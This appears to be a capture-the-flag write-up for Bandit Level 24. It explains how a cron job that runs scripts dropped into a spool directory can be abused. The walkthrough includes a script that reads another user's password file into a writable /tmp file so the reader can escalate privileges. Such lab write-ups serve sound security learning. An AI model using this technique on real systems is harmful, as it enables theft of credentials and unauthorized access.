# Level 24

> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

This is the script being executed as bandit24:
```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
``` 

Basically what this script does is look for any scripts located in `/var/spool/bandit24/` and, if the user is `bandit23`, executes them. I went to a temporary directory and wrote this
```
bandit23@bandit:/tmp/lsdkfaj$ touch savepass.sh
bandit23@bandit:/tmp/lsdkfaj$ chmod +x savepass.sh 
bandit23@bandit:/tmp/lsdkfaj$ vim savepass.sh
```
```
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/lsdkfaj/pass
```

That script should be enough. The only thing missing would be to create the `pass` file and allow bandit24 to write on it
```
bandit23@bandit:/tmp/lsdkfaj$ touch pass
bandit23@bandit:/tmp/lsdkfaj$ chmod +w pass
```

Copy `savepass.sh` to `/var/spool/bandit24/` and wait for the password to be sent to you.
